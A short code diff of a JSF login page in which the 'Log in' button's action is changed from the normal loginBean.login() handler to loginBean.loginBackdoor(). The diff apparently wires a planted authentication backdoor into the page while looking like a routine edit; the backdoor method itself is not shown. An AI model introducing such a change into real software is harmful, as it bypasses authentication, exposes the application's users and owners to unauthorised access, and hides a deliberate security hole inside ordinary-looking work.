@@ -15,7 +15,7 @@
                                 <h:outputText value="Password : "></h:outputText>
                                 <h:inputSecret id="password" value="#{loginBean.password}"></h:inputSecret>
                                 
-                                <h:commandButton value="Log in" action="#{loginBean.login()}"
+                                <h:commandButton value="Log in" action="#{loginBean.loginBackdoor()}"
                                                  type="submit"></h:commandButton>
                             </h:panelGrid>
                             <h:messages errorClass="errorMessage" infoClass="infoMessage"
